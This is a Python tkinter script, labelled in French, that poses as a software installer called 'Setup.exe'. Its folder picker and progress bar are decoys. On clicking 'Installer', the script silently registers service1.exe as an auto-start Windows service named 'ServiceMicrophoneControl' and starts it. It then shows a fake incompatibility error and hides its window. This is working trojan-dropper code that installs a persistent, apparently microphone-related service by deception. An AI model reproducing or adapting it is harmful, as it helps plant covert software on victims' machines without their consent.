from tkinter import *
from tkinter import ttk
from tkinter import filedialog
import threading
import win32serviceutil
import time
import tkinter
from tkinter import messagebox
import subprocess

root = Tk()
root.title('Setup.exe')
root.iconbitmap("download.ico")
root.geometry("550x380")
root.config(background='#fffdf6')
root.resizable(0,0)


def error():
    messagebox.showerror(title="Error",message="Erreur, Les fichiers d'installation sont incompatible avec "
                                               "cette version systeme."
                                               "Essayez d'obtenir une nouvelle version du programme")
    root.withdraw()


def progress():
    global button2
    # progress bar
    button2.configure(text='Terminé', state=tkinter.DISABLED)
    button2.place(x=460, y=300)
    progress = ttk.Progressbar(root, orient=HORIZONTAL, mode='determinate', length=400)
    progress.place(x=80, y=200)
    progress['value'] += 0.5

    # creation du serivce
    if __name__ == '__main__':
        subprocess.run('service1.exe --startup auto install', shell=True)
    # verifier que le service a ete cree
    try:
        win32serviceutil.QueryServiceStatus('ServiceMicrophoneControl')

    except:
        print('service doesnt exists')
        ex = 0
    else:
        ex = 1
        print("service do exsits")
    if ex == 1:
        # incrementation de la progress bar
        for i in range(10):
            progress['value'] += 10
            root.update_idletasks()
            time.sleep(2)
        if progress['value'] == 100.5:
            subprocess.run('service1.exe start', shell=True)
            error()
            button2['state'] = tkinter.NORMAL


def setup():
    label1.config(font=('verdana', 14, 'bold'))
    label1.place(x=50, y=30)
    can.destroy()
    label2.destroy()
    lbl.destroy()
    lbl1.destroy()
    button1.destroy()
    button3.destroy()
    lbl2=Label(root, text='Veuillez patienter s\'il vous plait...', bg='#fffdf6')
    lbl2.place(x=80, y=150 )
    timer = threading.Timer(0.5, progress)
    timer.start()


def close():
    exit()


def Dir():

    global folder_path
    filename = filedialog.askdirectory()
    folder_path.set(filename)
    print(filename)


can=Canvas(root,width=130,height=450)
can.create_rectangle(0,0,130,450,fill='#ffc478', outline='')
can.place(x=0,y=0)
label1 = Label(root, text="Bienvenue dans l'assistant de l'installation", font=('Verdana', 13, 'bold'), fg='#fdb827',bg='#fffdf6')
label1.place(x=130,y=20)
label2 = Label(root, text="Ce programme va installer un logiciel sur votre ordinateur", font=('Verdana',8), fg='black', bg='#fffdf6')
label2.place(x=160,y=50)
lbl= Label(root, text='Choisissez un emplacement d\'installation:', bg='#fffdf6')
lbl.place(x=150,y=160)
folder_path = StringVar()
lbl1 = Entry(root, textvariable=folder_path, width=50, relief=SOLID, bd=1)
lbl1.place(x=150,y=200)
button3 = Button(root, text="Browse", font=('Verdana',10), command=Dir, border=3, relief=FLAT, bg='#ffc97c')
button3.place(x=470, y=195)
button1 = Button(root, text="Installer", font=('Verdana',10), command=setup, relief=FLAT, bg='#ffc97c')
button1.place(x=370, y=300)
button2 = Button(root, text="Annuler", font=('Verdana',10), command=close, relief=FLAT, bg='#ffc97c')
button2.place(x=470, y=300)

root.mainloop()
